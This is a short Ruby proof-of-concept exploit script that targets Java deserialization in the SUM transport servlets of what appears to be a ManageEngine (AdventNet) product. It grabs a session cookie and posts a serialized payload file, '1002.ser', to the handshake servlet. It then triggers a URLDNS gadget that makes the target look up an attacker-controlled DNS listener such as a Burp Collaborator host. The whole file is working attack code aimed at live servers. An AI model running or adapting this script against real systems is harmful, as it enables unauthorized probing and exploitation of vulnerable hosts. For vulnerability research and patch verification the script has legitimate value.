require 'typhoeus'
require 'optparse'

def _make_request(uri, cookie = nil, body = nil)
  Typhoeus::Request.new(
    uri,
    method: :post,
    headers: {
      'Cookie' => cookie,
      'Content-Type' => 'application/octet-stream'
    },
    body: body
  ).run
end

options = {}
option_parser = OptionParser.new do |opts|
  opts.banner = 'Usage: poc.rb [options]'

  opts.on('-t', '--target', 'target to exploit (including scheme) e.g http://localhost:8060') do |t|
    options[:target] = t
  end

  opts.on('-l', '--listener', 'DNS Listener e.g 1766x23ymcldy2ppolrnvxngc7ix6m.burpcollaborator.net') do |l|
    options[:listener] = l
  end
end

option_parser.parse!

if [options[:target], options[:listener]].any?(nil)
  puts '[-] Missing required arguments.'
  puts option_parser.help
  return
end

target = options[:target]
listener = "http://#{options[:listener]}" # prepend http as required by URLDNS gadget

puts '[*] Firing off request to obtain a session cookie.'
r = _make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet")
cookie = r.headers['Set-Cookie']&.scan(/(JSESSIONID=\w+)/)&.flatten&.first

if cookie.nil?
  puts '[-] ERROR retrieving cookie; is the target correct? Aborting.'
  return
end

puts "[+] Obtained the following session cookie: #{cookie}"
puts '[*] Firing off request to set the requesthandler in the session cookie.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet", cookie, File.open('1002.ser', 'rb').read)
puts '[*] Firing off request to invoke the DNS Lookup.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet", cookie, nil) # <- length of serialized payload in bytes array + payload here
puts '[+] Request sent! Check your DNS Listener for any lookups!'
